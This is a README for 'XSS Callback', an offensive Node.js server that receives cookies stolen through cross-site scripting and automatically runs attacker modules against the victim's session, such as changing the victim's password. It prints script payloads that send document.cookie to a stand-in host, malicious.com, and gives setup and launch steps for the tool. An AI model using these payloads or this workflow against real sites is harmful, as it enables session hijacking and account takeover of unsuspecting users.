### XSS Callback

XSS Callback is a tool allowing you to exploit XSS vulnerabilities.

This is a HTTP Server (developed in Node.js) that is listening on a specific port (defined when launching it).
Everytime a victim will load the malicious link with his own cookie, the server will automatically launch the *offensive* module that you've written. 

**Example of module :**

*After getting the user's cookie :*
- Send a request to change his password
- Log him out

When the victim will load the malicious site wich such URL : 

```
http://malicious.com/cookie/<my-cookie>
```

This 'event' will trigger the exploit function in your custom module. 


### Basic exploitation of XSS 

One common way to exploit those flaws is to create a PHP file/CGI script that will harvest victim's cookies and collect them in some file/database. 

Example of those basic payload : 
```
<script>document.location='http://malicious.com/cookie.php?cookie='+document.cookie</script>
```

Then, the attacker will be able to re-use those information to hijack victim's session. Ok. 
<br />

### What to do with XSS Callback ? 

Instead of reading your file for victim's cookie, XSS Callback is doing **your** job by calling your *offensive* module,  dynamically loaded when starting the App. 

You just need to write your own module corresponding to the application you want to target and launch the application to be accessible from the outside. (On your server)

You don't have to wait and read a file anymore. You perform the attack directly when you receive some data on this specific URL. 
This is the concept of *event driven programming*. 
### Installation

Just clone the project : 
```
git clone git@github.com:PaulSec/XSS-Callback.git
```

Go in the directory and launch the application for the usage : 

```
cd XSS-Callback && node server.js
```

Usage is then displayed : 

```
Usage : node server.js <module.js> <port : default 8080>
```
### Use case


#### 1) Find a XSS

Ok, you got it! 

#### 2) Write your (offensive) module

Create your module in the folder ```module```.

The cookie of the victim is stored in the variable : ```req.params.cookie```. 

#### 3) Launch XSS Callback : 

On malicous.com, launch the tool : 

```
node server.js ./module/my-module.js 8080
```

#### 4) Insert your payload
Insert your payload on the website : 

```
<script>document.location='http://malicious.com:8080/cookie/'+document.cookie</script>
```

#### 5) Check the console log
You can see clients loading your page through the XSS, while your module is processing the attack using your victim's session. 
<br />
### License & Conclusion

Tool released under MIT License. 
Feel free to give your feedback, ask for new features for this tool. 
Moreover, if you need an example of how to write a module, don't hesitate. 

